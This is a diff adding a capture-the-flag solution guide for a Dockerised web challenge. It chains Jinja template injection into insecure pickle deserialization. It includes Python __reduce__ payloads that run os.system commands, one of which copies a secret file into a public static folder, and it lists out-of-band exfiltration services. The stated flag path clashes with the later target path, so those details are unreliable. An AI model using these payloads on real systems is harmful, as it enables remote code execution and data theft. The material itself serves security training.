@@ -1,0 +1,52 @@
+###################################
+#   REMOVE THIS FILE FOR THE CTF  #
+###################################
+Goal:
+Read the contents of '/home/flag.txt' through a vulnerability in the web application
+
+Setup:
+- docker build -t chal2-ctf .  
+- docker run -p 8000:8000 chal2-ctf
+
+
+Guide:
+1. POST /api/search endpoit allows for (sandboxed) server-side template injection
+2. Can be verified with {{7*7}} as 'searchKeyword' POST parameter
+3. code analysis shows that 'return_method' can be called via Jinja
+4. function uses pickle with base64 userinput, which leads to insecure deserialization. Can be exploited with local py:
+``
+import pickle
+import base64
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("ls -la",))
+
+payload = pickle.dumps(Exploit())
+encoded_payload = base64.b64encode(payload).decode() 
+
+print(encoded_payload)
+``
+5. Script returns base64 'gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZscyAtbGGUhZRSlC4=' which executes 'ls -la' but webapp doesnt return result
+6. Blind command injection, goal is to read /home/sweet/home.txt, so couple of possibilities:
+- time based extraction (if 1st char of home.txt = a, sleep 2)
+- write txt with result of command to /static folder
+- OOB (burp colab, pipedrea, interactsh) 
+
+example:
+``
+import pickle
+import base64
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("echo $(cat /home/sweet/home.txt) > /app/static/foo.txt",))
+
+payload = pickle.dumps(Exploit())
+encoded_payload = base64.b64encode(payload).decode()
+
+print(encoded_payload)
+
+``
